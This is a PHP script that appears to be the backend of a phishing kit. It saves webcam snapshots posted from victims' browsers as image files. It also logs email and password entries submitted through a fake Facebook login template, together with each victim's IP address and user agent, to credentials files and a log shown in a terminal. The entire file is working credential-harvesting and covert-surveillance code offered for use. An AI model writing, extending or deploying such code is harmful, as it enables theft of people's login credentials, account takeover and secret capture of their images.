<?php

$date = date('dMYHis');

// Handle camera data
if (!empty($_POST['cat'])) {
    $imageData = $_POST['cat'];
    error_log("Received" . "\r\n", 3, "Log.log");
    
    $filteredData = substr($imageData, strpos($imageData, ",") + 1);
    $unencodedData = base64_decode($filteredData);
    $fp = fopen('cam' . $date . '.png', 'wb');
    fwrite($fp, $unencodedData);
    fclose($fp);
}

// Handle email/password credentials from Facebook template
if (!empty($_POST['email']) || !empty($_POST['password'])) {
    $email = isset($_POST['email']) ? $_POST['email'] : '';
    $password = isset($_POST['password']) ? $_POST['password'] : '';
    $isFromFacebook = isset($_POST['template']) && $_POST['template'] === 'facebook';
    
    // Get IP address
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else {
        $ipaddress = $_SERVER['REMOTE_ADDR'];
    }
    
    // Get user agent
    $browser = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : 'Unknown';
    
    // Create credentials log file only if not from Facebook template
    if (!$isFromFacebook) {
        $credentials_file = 'credentials_' . $date . '.txt';
        $fp = fopen($credentials_file, 'w');
        fwrite($fp, "=== Facebook Login Credentials ===\r\n");
        fwrite($fp, "Date: " . date('Y-m-d H:i:s') . "\r\n");
        fwrite($fp, "IP: " . $ipaddress . "\r\n");
        fwrite($fp, "User-Agent: " . $browser . "\r\n");
        fwrite($fp, "---\r\n");
        fwrite($fp, "Email/Phone: " . $email . "\r\n");
        fwrite($fp, "Password: " . $password . "\r\n");
        fclose($fp);
    }
    
    // Log to ip.txt for terminal display (always log)
    $ip_file = 'ip.txt';
    $fp = fopen($ip_file, 'a');
    fwrite($fp, "IP: " . $ipaddress . "\r\n");
    fwrite($fp, "User-Agent: " . $browser . "\r\n");
    fwrite($fp, "Email/Phone: " . $email . "\r\n");
    fwrite($fp, "Password: " . $password . "\r\n");
    fwrite($fp, "---\r\n");
    fclose($fp);
}

exit();
?>

